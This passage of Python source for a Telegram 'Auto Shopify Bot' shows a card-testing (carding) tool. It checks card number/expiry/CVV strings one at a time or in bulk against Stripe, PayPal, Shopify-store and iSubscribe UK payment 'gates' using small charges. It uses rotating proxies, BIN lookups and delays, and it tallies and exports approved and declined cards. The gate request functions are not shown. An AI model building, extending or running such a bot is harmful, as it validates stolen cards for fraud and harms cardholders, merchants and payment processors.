[ϟ] 𝗖𝗼𝘂𝗻𝘁𝗿𝘆 : {country_line}
[ϟ] 𝗕𝗮𝗻𝗸 : {bank_name[:30]}
[ϟ] 𝗧𝘆𝗽𝗲 : {tipo_completo} | {tipo_especifico}
━━━━━━━━━━━━━━━━━━━━━━
[ϟ] T/t : {tiempo_str} | Proxy : {proxy_status}
[ϟ] 𝗖𝗵𝗲𝗸𝗲𝗱 𝗯𝘆 : @AutoShopifyBot
[ϟ] 𝗢𝘄𝗻𝗲𝗿 : {user_name}
╚━━━━「𝐀𝐔𝐓𝐎 𝐒𝐇𝐎𝐏𝐈𝐅𝐘 𝐁𝐎𝐓」━━━━╝
"""
    return texto

# ==================== PROXY TESTER ULTRA RÁPIDO ====================

proxy_semaphore = threading.Semaphore(50)

def test_proxy_rapido(proxy):
    with proxy_semaphore:
        try:
            start_time = time.time()
            
            partes = proxy.split(':')
            if len(partes) == 4:
                ip, puerto, user, passw = partes
                proxy_dict = {
                    'http': f'http://{user}:{passw}@{ip}:{puerto}',
                    'https': f'https://{user}:{passw}@{ip}:{puerto}'
                }
            else:
                proxy_dict = {
                    'http': f'http://{proxy}',
                    'https': f'https://{proxy}'
                }
            
            response = requests.get(
                'http://httpbin.org/ip',
                proxies=proxy_dict,
                timeout=3
            )
            
            elapsed = time.time() - start_time
            
            if response.status_code == 200:
                if elapsed < 2:
                    return (proxy, 'alive', f"{elapsed:.2f}s")
                else:
                    return (proxy, 'slow', f"{elapsed:.2f}s")
            else:
                return (proxy, 'dead', f"HTTP {response.status_code}")
                
        except requests.exceptions.ConnectTimeout:
            return (proxy, 'dead', "Timeout")
        except requests.exceptions.ProxyError:
            return (proxy, 'dead', "Proxy Error")
        except Exception as e:
            return (proxy, 'dead', str(e)[:20])

@bot.message_handler(commands=['px', 'pxfast', 'proxytest'])
def cmd_test_proxies_ultra_rapido(message):
    proxies = obtener_proxies()
    total = len(proxies)
    
    if not proxies:
        bot.reply_to(message, "📭 No hay proxies guardados para testear")
        return
    
    msg = bot.reply_to(message, f"⚡ INICIANDO TEST ULTRA RÁPIDO")
    
    progress_msg = bot.send_message(
        message.chat.id,
        f"📊 Progreso: 0/{total} proxies\n"
        f"⏱️ Tiempo estimado: {total//10} segundos"
    )
    
    resultados = {'alive': [], 'slow': [], 'dead': []}
    start_total = time.time()
    procesados = 0
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        future_to_proxy = {executor.submit(test_proxy_rapido, proxy): proxy for proxy in proxies}
        
        for future in as_completed(future_to_proxy):
            try:
                proxy, status, info = future.result(timeout=4)
                resultados[status].append((proxy, info))
                actualizar_status_proxy(proxy, status, info)
            except:
                proxy = future_to_proxy[future]
                resultados['dead'].append((proxy, "Error"))
                actualizar_status_proxy(proxy, 'dead', "Error")
            
            procesados += 1
            
            if procesados % 10 == 0 or procesados == total:
                elapsed = time.time() - start_total
                porcentaje = (procesados / total) * 100
                barra = "█" * int(porcentaje/5) + "░" * (20 - int(porcentaje/5))
                
                velocidad = procesados / elapsed if elapsed > 0 else 0
                tiempo_restante = (total - procesados) / velocidad if velocidad > 0 else 0
                
                try:
                    bot.edit_message_text(
                        f"⚡ TEST ULTRA RÁPIDO DE PROXIES\n"
                        f"{barra}\n"
                        f"📊 Progreso: {procesados}/{total} ({porcentaje:.1f}%)\n"
                        f"⚡ Velocidad: {velocidad:.1f} proxies/seg\n"
                        f"⏱️ Tiempo restante: {tiempo_restante:.0f} seg\n"
                        f"✅ Vivos: {len(resultados['alive'])}  🐢 Lentos: {len(resultados['slow'])}  ❌ Muertos: {len(resultados['dead'])}",
                        message.chat.id,
                        progress_msg.message_id
                    )
                except:
                    pass
    
    tiempo_total = time.time() - start_total
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    texto_final = f"""✅ TEST ULTRA RÁPIDO COMPLETADO
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS FINALES:

✅ Vivos (<2s): {len(resultados['alive'])}
🐢 Lentos (>2s): {len(resultados['slow'])}
❌ Muertos: {len(resultados['dead'])}
━━━━━━━━━━━━━━━━━━━━━━
⚡ Velocidad: {total/tiempo_total:.1f} proxies/seg
⏱️ Tiempo total: {minutos}m {segundos}s"""
    
    try:
        bot.edit_message_text(texto_final, message.chat.id, progress_msg.message_id)
    except:
        bot.send_message(message.chat.id, texto_final)

# ==================== MENÚS Y BOTONES ====================

def menu_principal():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💳 Tarjetas", callback_data='menu_tarjetas')
    btn2 = types.InlineKeyboardButton("🌐 Proxies", callback_data='menu_proxies')
    btn3 = types.InlineKeyboardButton("💵 Stripe $1 No AVS", callback_data='menu_stripe_noavs')
    btn4 = types.InlineKeyboardButton("💰 PayPal", callback_data='menu_paypal')
    btn5 = types.InlineKeyboardButton("🛍️ AutoShopify", callback_data='menu_shopify')
    btn6 = types.InlineKeyboardButton("🇬🇧 iSubscribe UK", callback_data='menu_isubscribe')
    btn7 = types.InlineKeyboardButton("📊 Estadísticas", callback_data='menu_stats')
    btn8 = types.InlineKeyboardButton("📁 Cargar archivo", callback_data='menu_cargar')
    btn9 = types.InlineKeyboardButton("🧹 Limpiar sitios", callback_data='clean_sites')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8, btn9)
    return markup

def menu_tarjetas():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("📋 Listar tarjetas", callback_data='listar_tarjetas')
    btn2 = types.InlineKeyboardButton("🗑️ Eliminar tarjeta", callback_data='eliminar_tarjeta')
    btn3 = types.InlineKeyboardButton("🧹 Limpiar todas", callback_data='limpiar_tarjetas')
    btn4 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4)
    return markup

def menu_proxies():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("➕ Añadir proxy", callback_data='add_proxy')
    btn2 = types.InlineKeyboardButton("📋 Listar proxies", callback_data='listar_proxies')
    btn3 = types.InlineKeyboardButton("🗑️ Eliminar proxy", callback_data='del_proxy')
    btn4 = types.InlineKeyboardButton("🗑️ Eliminar TODOS", callback_data='del_all_proxies')
    btn5 = types.InlineKeyboardButton("🧹 Limpiar muertos", callback_data='clean_dead')
    btn6 = types.InlineKeyboardButton("⚡ Test ultra rápido", callback_data='test_proxies_fast')
    btn7 = types.InlineKeyboardButton("📥 Exportar proxies", callback_data='export_proxies')
    btn8 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8)
    return markup

def menu_paypal():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("💰 PayPal $10", callback_data='paypal_10')
    btn2 = types.InlineKeyboardButton("🪙 PayPal $0.10", callback_data='paypal_01')
    btn3 = types.InlineKeyboardButton("💎 PayPal $1", callback_data='paypal_1')
    btn4 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4)
    return markup

def menu_shopify():
    markup = types.InlineKeyboardMarkup(row_width=2)
    btn1 = types.InlineKeyboardButton("➕ Añadir sitio", callback_data='add_sitio')
    btn2 = types.InlineKeyboardButton("📋 Listar sitios", callback_data='listar_sitios')
    btn3 = types.InlineKeyboardButton("🗑️ Eliminar sitio", callback_data='del_sitio')
    btn4 = types.InlineKeyboardButton("🗑️ Eliminar TODOS", callback_data='del_all_sitios')
    btn5 = types.InlineKeyboardButton("🔍 Verificar una", callback_data='shopify_individual')
    btn6 = types.InlineKeyboardButton("📦 Verificar masivo", callback_data='shopify_masivo')
    btn7 = types.InlineKeyboardButton("🧹 Limpiar sitios", callback_data='clean_sites')
    btn8 = types.InlineKeyboardButton("🔙 Volver", callback_data='volver_principal')
    markup.add(btn1, btn2, btn3, btn4, btn5, btn6, btn7, btn8)
    return markup

# ==================== COMANDOS PRINCIPALES ====================

@bot.message_handler(commands=['start', 'menu'])
def cmd_menu(message):
    texto = (
        "╔════════════════════════════╗\n"
        "║    🚀  AUTO SHOPIFY BOT    ║\n"
        "╠════════════════════════════╣\n"
        "║  Gates disponibles:         ║\n"
        "║  • /check5 - Stripe $1     ║\n"
        "║  • /pp - PayPal $10        ║\n"
        "║  • /pp2 - PayPal $0.10     ║\n"
        "║  • /pp3 - PayPal $1        ║\n"
        "║  • /sh - AutoShopify       ║\n"
        "║  • /uk - iSubscribe UK £4  ║\n"
        "║                            ║\n"
        "║  📦 Masivos:                ║\n"
        "║  • /mass - Stripe          ║\n"
        "║  • /mpp - PayPal ($0.10)   ║\n"
        "║  • /msh - Shopify (RÁPIDO) ║\n"
        "║  • /muk - iSubscribe (RÁPIDO)║\n"
        "║                            ║\n"
        "║  ⚡ Otros:                  ║\n"
        "║  • /px - Test proxies      ║\n"
        "║  • /cleansites - Limpiar   ║\n"
        "║  • /exportproxies - Exportar║\n"
        "╚════════════════════════════╝\n\n"
        "Selecciona una opción:"
    )
    bot.send_message(message.chat.id, texto, reply_markup=menu_principal())

@bot.message_handler(commands=['help'])
def cmd_help(message):
    texto = (
        "╔════════════════════════════╗\n"
        "║        ❓ AYUDA             ║\n"
        "╠════════════════════════════╣\n"
        "║  • /check5 CC - Stripe $1  ║\n"
        "║  • /pp CC - PayPal $10     ║\n"
        "║  • /pp2 CC - PayPal $0.10  ║\n"
        "║  • /pp3 CC - PayPal $1     ║\n"
        "║  • /sh CC - AutoShopify    ║\n"
        "║  • /uk CC - iSubscribe UK  ║\n"
        "║  • /mass - Stripe masivo   ║\n"
        "║  • /mpp - PayPal masivo    ║\n"
        "║  • /msh - Shopify masivo (RÁPIDO)║\n"
        "║  • /muk - iSubscribe masivo (RÁPIDO)║\n"
        "║  • /px - Test proxies      ║\n"
        "║  • /cleansites - Limpiar   ║\n"
        "║  • /exportproxies - Exportar║\n"
        "║  • /bin BIN - Consultar BIN║\n"
        "║  • /stats - Estadísticas   ║\n"
        "╚════════════════════════════╝"
    )
    bot.reply_to(message, texto)

@bot.message_handler(commands=['addsh'])
def cmd_add_sitio(message):
    try:
        url = message.text.split()[1]
        if guardar_sitio(url):
            bot.reply_to(message, f"✅ Sitio guardado:\n{url}")
        else:
            bot.reply_to(message, "❌ Error: El sitio ya existe o URL inválida")
    except IndexError:
        bot.reply_to(message, "❌ Uso: /addsh https://ejemplo.com")

@bot.message_handler(commands=['sitios'])
def cmd_listar_sitios(message):
    sitios = obtener_sitios_con_estadisticas()
    
    if not sitios:
        bot.send_message(message.chat.id, "📭 No hay sitios guardados")
        return
    
    texto = "╔════════════════════════════╗\n║     🛍️ MIS SITIOS        ║\n╠════════════════════════════╣\n"
    
    for url, succ, fail, last_used in sitios[:10]:
        url_short = url[:25] + "..." if len(url) > 25 else url
        total = succ + fail
        tasa = (succ/total*100) if total > 0 else 0
        
        texto += f"║ {url_short:<28} ║\n║    ├─ ✅ {succ}  ❌ {fail}        ║\n║    └─ 📊 {tasa:.1f}%            ║\n"
    
    texto += "╚════════════════════════════╝"
    bot.send_message(message.chat.id, texto, reply_markup=menu_shopify())

@bot.message_handler(commands=['delsh'])
def cmd_del_sitio(message):
    try:
        url = message.text.split()[1]
        if eliminar_sitio(url):
            bot.reply_to(message, f"✅ Sitio eliminado: {url[:30]}...")
        else:
            bot.reply_to(message, "❌ Sitio no encontrado")
    except IndexError:
        bot.reply_to(message, "❌ Uso: /delsh https://ejemplo.com")

@bot.message_handler(commands=['delallsitios'])
def cmd_del_all_sitios(message):
    confirmacion = types.InlineKeyboardMarkup()
    btn1 = types.InlineKeyboardButton("✅ Sí, eliminar todos", callback_data='confirm_del_all_sitios')
    btn2 = types.InlineKeyboardButton("❌ No, cancelar", callback_data='cancel_del_all_sitios')
    confirmacion.add(btn1, btn2)
    
    bot.reply_to(
        message, 
        "⚠️ *¿ESTÁS SEGURO?*\n\nEsto eliminará TODOS los sitios guardados permanentemente.",
        parse_mode='Markdown',
        reply_markup=confirmacion
    )

@bot.message_handler(commands=['cleansites'])
def cmd_clean_sites(message):
    msg = bot.reply_to(message, "🧹 Limpiando sitios muertos...")
    
    try:
        eliminados = limpiar_sitios_muertos()
        sitios_restantes = len(obtener_sitios())
        
        texto = f"""🧹 LIMPIEZA DE SITIOS COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
🗑️ Sitios eliminados: {eliminados}
📌 Sitios restantes: {sitios_restantes}

Los sitios que no responden con 3D, Charge, Approved, Decline o CAPTCHA
han sido eliminados automáticamente."""
        
        bot.edit_message_text(texto, message.chat.id, msg.message_id)
        
    except Exception as e:
        bot.edit_message_text(f"❌ Error: {str(e)}", message.chat.id, msg.message_id)

@bot.message_handler(commands=['exportproxies', 'exportarproxies'])
def cmd_export_proxies(message):
    proxies = obtener_proxies()
    
    if not proxies:
        bot.reply_to(message, "📭 No hay proxies guardados para exportar")
        return
    
    filename = f"proxies_export_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
    with open(filename, 'w', encoding='utf-8') as f:
        f.write("# PROXIES EXPORTADOS\n")
        f.write(f"# Fecha: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        f.write(f"# Total: {len(proxies)}\n")
        f.write("# ========================================\n\n")
        for proxy in proxies:
            f.write(f"{proxy}\n")
    
    with open(filename, 'rb') as f:
        bot.send_document(
            message.chat.id,
            f,
            caption=f"📦 Exportación de proxies\n📊 Total: {len(proxies)} proxies\n📅 {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
    
    os.remove(filename)

# ==================== COMANDOS DE VERIFICACIÓN ====================

@bot.message_handler(commands=['check5'])
def cmd_check_5(message):
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con Stripe $1 No AVS...")
        
        bin_info = consultar_bin_con_cache(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxy = obtener_proximo_proxy()
        resultado = verificar_api_stripe_noavs(cc, proxy)
        
        if resultado:
            guardar_historial(cc, resultado['proxy'], 'Stripe $1 No AVS', resultado['amount'], 
                            resultado['status'], resultado['message'], resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, resultado, bin_info, resultado['tiempo'], user_name, "Stripe $1 No AVS")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /check5 NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['pp'])
def cmd_pp(message):
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con PayPal $10.00...")
        
        bin_info = consultar_bin_con_cache(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxy = obtener_proximo_proxy()
        resultado = verificar_api_paypal(cc, gate=1, proxy=proxy)
        
        if resultado:
            guardar_historial(cc, resultado['proxy'], 'PayPal $10', resultado['amount'], 
                            resultado['status'], resultado['message'], resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, resultado, bin_info, resultado['tiempo'], user_name, "PayPal $10")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['pp2'])
def cmd_pp2(message):
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con PayPal $0.10...")
        
        bin_info = consultar_bin_con_cache(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxy = obtener_proximo_proxy()
        resultado = verificar_api_paypal(cc, gate=2, proxy=proxy)
        
        if resultado:
            guardar_historial(cc, resultado['proxy'], 'PayPal $0.10', resultado['amount'], 
                            resultado['status'], resultado['message'], resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, resultado, bin_info, resultado['tiempo'], user_name, "PayPal $0.10")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp2 NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['pp3'])
def cmd_pp3(message):
    try:
        cc = message.text.split()[1]
        
        partes = cc.split('|')
        if len(partes) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = partes[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🔍 Verificando con PayPal $1.00...")
        
        bin_info = consultar_bin_con_cache(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxy = obtener_proximo_proxy()
        resultado = verificar_api_paypal(cc, gate=3, proxy=proxy)
        
        if resultado:
            guardar_historial(cc, resultado['proxy'], 'PayPal $1', resultado['amount'], 
                            resultado['status'], resultado['message'], resultado['gates'], bin_info)
            
            texto_premium = formato_check_premium(cc, resultado, bin_info, resultado['tiempo'], user_name, "PayPal $1")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /pp3 NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['sh'])
def cmd_shopify(message):
    try:
        partes = message.text.split()
        cc = partes[1]
        
        if len(cc.split('|')) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        if len(partes) == 3:
            url = partes[2]
            sitios = obtener_sitios()
            if url not in sitios:
                bot.reply_to(message, "❌ Sitio no encontrado en tu lista")
                return
        else:
            url = obtener_proximo_sitio()
            if not url:
                bot.reply_to(message, "❌ No hay sitios guardados. Usa /addsh para agregar uno.")
                return
        
        proxy = obtener_proximo_proxy()
        
        numero = cc.split('|')[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, f"🔄 Verificando con AutoShopify...\n📍 Sitio: {url[:40]}...\n🌐 Proxy: {proxy[:30] if proxy else 'directo'}...")
        
        bin_info = consultar_bin_con_cache(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        resultado = verificar_api_autoshopify(cc, url, proxy)
        
        if resultado:
            guardar_historial(cc, resultado['proxy'], f"Shopify ${resultado['amount']}", 
                            resultado['amount'], resultado['status'], 
                            resultado['message'], resultado['gates'], bin_info)
            
            actualizar_estadisticas_sitio(url, resultado['success'])
            
            texto_premium = formato_check_premium(cc, resultado, bin_info, resultado['tiempo'], user_name, "Shopify")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /sh NUMERO|MES|AÑO|CVV [URL]")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

@bot.message_handler(commands=['uk'])
def cmd_uk(message):
    try:
        cc = message.text.split()[1]
        
        if len(cc.split('|')) != 4:
            bot.reply_to(message, "❌ Formato incorrecto. Usa: NUMERO|MES|AÑO|CVV")
            return
        
        numero = cc.split('|')[0]
        bin_num = numero[:6]
        
        msg = bot.reply_to(message, "🇬🇧 Verificando con iSubscribe UK (£4.00)...")
        
        bin_info = consultar_bin_con_cache(bin_num)
        user_name = message.from_user.first_name if message.from_user else "User"
        
        proxy = obtener_proximo_proxy()
        resultado = verificar_isubscribe(cc, proxy)
        
        if resultado:
            guardar_historial(cc, resultado['proxy'], 'iSubscribe UK £4', resultado['amount'], 
                            resultado['status'], resultado['message'], 'isubscribe uk', bin_info)
            
            texto_premium = formato_check_premium(cc, resultado, bin_info, resultado['tiempo'], user_name, "iSubscribe UK £4")
            bot.edit_message_text(texto_premium, message.chat.id, msg.message_id)
        else:
            bot.edit_message_text("❌ No se pudo verificar", message.chat.id, msg.message_id)
        
    except IndexError:
        bot.reply_to(message, "❌ Uso: /uk NUMERO|MES|AÑO|CVV")
    except Exception as e:
        bot.reply_to(message, f"❌ Error: {str(e)}")

# ==================== VERIFICACIÓN MASIVA STRIPE ====================

@bot.message_handler(commands=['mass'])
def cmd_mass_stripe(message):
    tarjetas = obtener_todas_tarjetas()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    texto = message.text.split()
    delay = 2
    notificar_cada = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
    
    task_id = f"mass_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {'chat_id': message.chat.id, 'cancel': False}
    
    config = f"""📋 VERIFICACIÓN MASIVA STRIPE $1 NO AVS
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
⏱️ Delay: {delay}s
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}
/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_masivo_stripe, args=(task_id, message.chat.id, delay, notificar_cada))
    thread.daemon = True
    thread.start()

def procesar_masivo_stripe(task_id, chat_id, delay, notificar_cada):
    cards = [c[0] for c in obtener_todas_tarjetas()]
    total = len(cards)
    
    if total == 0:
        bot.send_message(chat_id, "📭 No hay tarjetas")
        return
    
    msg = bot.send_message(chat_id, "🔄 Iniciando verificación Stripe...")
    
    resultados = {'success': 0, 'failed': 0, 'error': 0}
    detalles = []
    start_time = time.time()
    
    for i, card in enumerate(cards, 1):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
            break
        
        bin_info = consultar_bin_con_cache(card[:6])
        proxy = obtener_proximo_proxy()
        resultado = verificar_api_stripe_noavs(card, proxy)
        
        if resultado:
            guardar_historial(card, resultado['proxy'], 'Stripe $1 No AVS', resultado['amount'],
                            resultado['status'], resultado['message'], resultado['gates'], bin_info)
            
            if resultado['status'] == 'success':
                resultados['success'] += 1
                emoji = "✅"
            elif resultado['status'] == 'failed':
                resultados['failed'] += 1
                emoji = "❌"
            else:
                resultados['error'] += 1
                emoji = "⚠️"
            
            detalles.append(f"{emoji} {card} | {resultado['status']} | {resultado['message'][:50]}")
        
        if i % notificar_cada == 0 or i == total:
            porcentaje = (i / total) * 100
            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
            
            texto = f"""📊 PROGRESO: {i}/{total}
{barra} {porcentaje:.0f}%
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}"""
            
            try:
                bot.edit_message_text(texto, chat_id, msg.message_id)
            except:
                pass
        
        if delay > 0 and i < total:
            time.sleep(delay)
    
    tiempo_total = time.time() - start_time
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    filename = f"resultados_stripe_{task_id}.txt"
    with open(filename, 'w') as f:
        f.write(f"RESULTADOS STRIPE $1 NO AVS\n")
        f.write(f"Fecha: {datetime.now()}\n")
        f.write(f"Total: {total}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n\n")
        f.write(f"✅ Aprobadas: {resultados['success']}\n")
        f.write(f"❌ Declinadas: {resultados['failed']}\n")
        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
        for d in detalles:
            f.write(f"{d}\n")
    
    texto_final = f"""✅ VERIFICACIÓN STRIPE COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
⏱️ Tiempo: {minutos}m {segundos}s"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f)
    
    os.remove(filename)
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

# ==================== VERIFICACIÓN MASIVA PAYPAL ====================

@bot.message_handler(commands=['mpp'])
def cmd_mass_paypal(message):
    tarjetas = obtener_todas_tarjetas()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    texto = message.text.split()
    delay = 2
    notificar_cada = 10
    
    for i, arg in enumerate(texto):
        if arg == '--delay' and i+1 < len(texto):
            try:
                delay = int(texto[i+1])
            except:
                pass
        elif arg == '--notificar' and i+1 < len(texto):
            try:
                notificar_cada = int(texto[i+1])
            except:
                pass
    
    task_id = f"mpp_{datetime.now().strftime('%Y%m%d%H%M%S')}_{random.randint(1000,9999)}"
    
    active_tasks[task_id] = {'chat_id': message.chat.id, 'cancel': False}
    
    config = f"""💰 VERIFICACIÓN MASIVA PAYPAL $0.10
━━━━━━━━━━━━━━━━━━━━━━
📌 Tarjetas: {len(tarjetas)}
⏱️ Delay: {delay}s
🔔 Notificar: cada {notificar_cada}
🆔 ID: {task_id}
/cancelar_{task_id} - Cancelar"""
    
    bot.reply_to(message, config)
    
    thread = Thread(target=procesar_masivo_paypal, args=(task_id, message.chat.id, delay, notificar_cada))
    thread.daemon = True
    thread.start()

def procesar_masivo_paypal(task_id, chat_id, delay, notificar_cada):
    cards = [c[0] for c in obtener_todas_tarjetas()]
    total = len(cards)
    
    if total == 0:
        bot.send_message(chat_id, "📭 No hay tarjetas")
        return
    
    msg = bot.send_message(chat_id, "🔄 Iniciando verificación PayPal $0.10...")
    
    resultados = {'success': 0, 'failed': 0, 'error': 0}
    detalles = []
    start_time = time.time()
    
    for i, card in enumerate(cards, 1):
        if task_id in active_tasks and active_tasks[task_id].get('cancel'):
            bot.edit_message_text("🛑 Cancelado", chat_id, msg.message_id)
            break
        
        bin_info = consultar_bin_con_cache(card[:6])
        proxy = obtener_proximo_proxy()
        resultado = verificar_api_paypal(card, gate=2, proxy=proxy)
        
        if resultado:
            guardar_historial(card, resultado['proxy'], 'PayPal $0.10', resultado['amount'],
                            resultado['status'], resultado['message'], resultado['gates'], bin_info)
            
            if resultado['status'] == 'success':
                resultados['success'] += 1
                emoji = "✅"
            elif resultado['status'] == 'failed':
                resultados['failed'] += 1
                emoji = "❌"
            else:
                resultados['error'] += 1
                emoji = "⚠️"
            
            detalles.append(f"{emoji} {card} | {resultado['status']} | {resultado['message'][:50]}")
        
        if i % notificar_cada == 0 or i == total:
            porcentaje = (i / total) * 100
            barra = "█" * int(porcentaje/10) + "░" * (10 - int(porcentaje/10))
            
            texto = f"""📊 PROGRESO: {i}/{total}
{barra} {porcentaje:.0f}%
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}"""
            
            try:
                bot.edit_message_text(texto, chat_id, msg.message_id)
            except:
                pass
        
        if delay > 0 and i < total:
            time.sleep(delay)
    
    tiempo_total = time.time() - start_time
    minutos = int(tiempo_total // 60)
    segundos = int(tiempo_total % 60)
    
    filename = f"resultados_paypal_{task_id}.txt"
    with open(filename, 'w') as f:
        f.write(f"RESULTADOS PAYPAL $0.10\n")
        f.write(f"Fecha: {datetime.now()}\n")
        f.write(f"Total: {total}\n")
        f.write(f"Tiempo: {minutos}m {segundos}s\n\n")
        f.write(f"✅ Aprobadas: {resultados['success']}\n")
        f.write(f"❌ Declinadas: {resultados['failed']}\n")
        f.write(f"⚠️ Errores: {resultados['error']}\n\n")
        for d in detalles:
            f.write(f"{d}\n")
    
    texto_final = f"""✅ VERIFICACIÓN PAYPAL COMPLETADA
━━━━━━━━━━━━━━━━━━━━━━
📊 RESULTADOS:
✅ Aprobadas: {resultados['success']}
❌ Declinadas: {resultados['failed']}
⚠️ Errores: {resultados['error']}
⏱️ Tiempo: {minutos}m {segundos}s"""
    
    try:
        bot.edit_message_text(texto_final, chat_id, msg.message_id)
    except:
        bot.send_message(chat_id, texto_final)
    
    with open(filename, 'rb') as f:
        bot.send_document(chat_id, f)
    
    os.remove(filename)
    time.sleep(300)
    if task_id in active_tasks:
        del active_tasks[task_id]

# ==================== VERIFICACIÓN MASIVA SHOPIFY (VERSIÓN RÁPIDA) ====================

@bot.message_handler(commands=['msh'])
def cmd_mass_shopify_rapido(message):
    """Verificación masiva con AutoShopify - VERSIÓN RÁPIDA CON HILOS"""
    tarjetas = obtener_todas_tarjetas()
    sitios = obtener_sitios()
    
    if not tarjetas:
        bot.reply_to(message, "📭 No hay tarjetas guardadas")
        return
    
    if not sitios:
        bot.reply_to(message, "📭 No hay sitios guardados. Usa /addsh para agregar.")
        return
    
    texto = message.text.split()
    delay = 0
